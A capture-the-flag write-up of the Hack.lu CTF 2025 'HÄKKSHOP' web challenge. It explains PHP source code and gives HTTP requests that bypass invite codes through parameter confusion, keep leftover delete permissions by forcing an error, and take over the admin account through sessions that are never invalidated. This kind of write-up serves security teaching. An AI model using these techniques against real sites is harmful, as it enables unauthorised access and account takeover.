---
title: CTF | HÄKKSHOP
description: Hack.lu CTF 2025
date: "2025-11-01"
tldr: Wrong check of invitation codes, elevating privileges by triggering an error in the middle a function, wrong session handling (missing session invalidation logic). 
draft: false
tags: [ctf,php,auth,session] 
toc: false
---

**CTF:** Hack.lu CTF 2025
**Challenge created by**: `pspaul`
**Category:** Web
**Points:** 121
**Goal:** Shop all the hacker things!

## First Look

After a first look at the source code of the challenge, it is clear that it is going to be a authentication/authorization bypass lab. The main evidence is that the endpoint containing the flag has authorization checks:

```php
<?php
// src/flag.php

include_once 'inc/required.php';
include_once 'inc/perms.php';

enforce_auth();

include_once 'inc/header.php';

if (has_perms('flag_read')) {
    echo '<h2>Flag</h2>';
    echo '<p>Flag: <code>' . getenv('FLAG') . '</code></p>';
} else {
    echo '<h2>Flag</h2>';
    echo '<p>You do not have permission to view the flag.</p>';
}

include_once 'inc/footer.php';
```

Looking at the web in production enviroment, the next obstacle becomes apparent - we do not even have an account to log in with. Instead, the registration is possible only if we own a special invite code.

## Invite Code Bypass

It can be observed that in the database handling code is an apparent SQL injection vulnerability:

```php
private function buildWhere($where, $op = 'AND') {
    // previous iterations handled username and password
    // iteration for "code":
    // $name is 'code'
    // $value is ['!=', '']
    
    // ...
    } else {
        // quoteName('code') returns `code`
        // calling buildTerm(['!=', ''])
        $sql .= ' ' . $this->quoteName($name) . $this->buildTerm($value);
    }
    // ...
}

private function buildTerm($term) {
    // $term is ['!=', '']

    if (is_array($term)) { // true
        
        // count($term) == 2
        // isset($term[0]) == true
        // isOperator('!=') == true (see isOperator())
        if (count($term) == 2 && isset($term[0]) && $this->isOperator($term[0])) {
            $comparison = $term[0]; // becomes '!='
            $criterion_value = $term[1]; // becomes ''
            
        } else {
            return 'IN ' . $this->buildValue($term);
        }
    } else {
        // skipped
    }

    // buildValue('') returns the string '' 
    // result string: " != ''"
    return " $comparison " . $this->buildValue($criterion_value); 
}

private function isOperator($operator) {
    // $operator is '!='
    return in_array($operator, [
        '=', '!=', '<', '<=', '>', '>=', '<>',
        'LIKE', 'NOT LIKE', 'IN', 'NOT IN',
    ], true); // returns true
}
```

If we pass the `code` as a list, we can create following SQL query:

```sql
SELECT * FROM invites WHERE `code` != '';
```

That will always evaluate to `true`, as \`code\` is never equal to empty string.

The goal now is how can the `code` parameter be a list and not a string?

From the code handling the invitation is clear, that the logic is flawed and can be bypassed. The invitation code is sent to the server by POST request, where the `code` is originally in the data part of the POST request. 

```http
POST /register.php HTTP/1.1
Host: fdf8127bd15a8b51.xn--hkk-qla.shop
Content-Length: 45
Content-Type: application/x-www-form-urlencoded

username=mike&password=pass&code=somecode
```

However in the code, the `code` parameter is at first being checked by condition `is_string($_REQUEST['code'])` and later by `is_valid_invite($_POST['code'])`. In PHP the variables from `$_REQUEST` come from the GET -> POST -> COOKIE inputs in this order by default. But `$_POST` takes only the POST data. This knowledge is very handy. We can send a cookie `code` as an empty string and that will make the `is_string($_REQUEST['code'])` condition evaluate to true. And in the POST data parameters, we can send the list that will lead to the SQL injection evaluating the `is_valid_invite($_POST['code'])` to true.

```http
POST /register.php HTTP/1.1
Host: fdf8127bd15a8b51.xn--hkk-qla.shop
Cookie: code
Content-Length: 45
Content-Type: application/x-www-form-urlencoded

username=mike&password=pass&code[]=!=&code[]=
```

## Log in

Now we can log in with our registered account. An interesting fact can be observed. If no session cookie is provided during the login request, a new one is issued. However, when the user provides the `PHPSESSID` in the login request, that exact cookie becomes valid logged in cookie. 

## Delete Account Functionality

There is not much that we are able to do as logged in user. We can only delete our own account. 

Observing the source code handling the deletion of an account, we see that the function before deletion grants the user session temporary `users_delete` and `perms_delete` permissions. After delete, the permissions are deleted.

We can however terminate the function right after granting our session the permissions. That would leave the permissions for our session permanent. The termination can be done by passing parameter `msg` as an array and not a string. That will cause en error in that part of code before invalidating the delete permissions.

```http
POST /settings.php?uid=2&msg[]=x HTTP/1.1
Cookie: PHPSESSID=396f3535c2e9346a182df142fb49a46d
Content-Type: application/x-www-form-urlencoded
Content-Length: 14

delete-user=1
```

So now, we can delete other users and we know that our user ID is 2. ID number 1 is probably the admin user.

## Install Script

Deletion of other users is nice, but we need to find a path how to obtain the admin permissions. `install.php` script plays a crucial role. The script creates an admin account if there is none. In addition, the script will trigger if we access the resource `/install.php`.

## Admin Deletion

So lets delete admin.

```
POST /settings.php?uid=1 HTTP/1.1
Cookie: PHPSESSID=396f3535c2e9346a182df142fb49a46d
Content-Type: application/x-www-form-urlencoded
Content-Length: 14

delete-user=1
```

## New User ID 1

Now when we register a new user, his ID will be the lowest available = 1. We will also obtain a valid session for user ID 1. That could be useful if the session handling is flawed.

```http
POST /login.php HTTP/1.1
Content-Length: 27
Origin: https://d2d7ccd10da6c316.xn--hkk-qla.shop
Content-Type: application/x-www-form-urlencoded

username=fill&password=pass
```

We can delete that account of ID 1 and save the session for later.  

## Admin Recreation

Let's use the `install.php` script and test, if the session handling is flawed, more specifically, can we log in as just created administrator using the session we created for now deleted account which ID was also 1?

```http
GET /install.php HTTP/1.1
Cookie: PHPSESSID=396f3535c2e9346a182df142fb49a46d
```

```http
GET /flag.php HTTP/1.1
Cookie: PHPSESSID=396f3535c2e9346a182df142fb49a46d
```

And the flag is there! The session we saved was granted with the admin permissions (`flag_read`) and we can read the `/flag.php`.

The server session handling is really wrong. When an user is deleted, it never invalidates the session connected to the user ID. That allowed us to create a session for a specific user ID of user A and then use that same session for user B holding the same user ID. 